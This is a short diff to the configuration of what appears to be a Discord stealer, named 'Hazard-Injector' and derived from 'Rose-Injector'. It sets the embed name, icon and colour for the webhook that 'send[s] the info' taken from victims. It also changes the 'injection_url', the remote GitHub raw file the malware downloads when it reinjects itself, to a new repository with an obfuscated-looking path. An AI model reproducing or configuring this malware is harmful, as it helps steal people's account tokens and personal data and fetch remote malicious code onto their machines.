@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Hazard-Injector', //name of the webhook thats gonna send the info
   embed_icon: 'https://i.imgur.com/EZFAJXh.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16766720, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/BasedAndReal/KBUv.y2tKxuCx1jDA0fKZdxauoLu_jy1RuFc0cOk_MOOB.pAxkrPrOnyqwcLBw7ZpKbwf3dOrIOL1R.57EV-Hj4bZsuD1ezSveUK/main/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
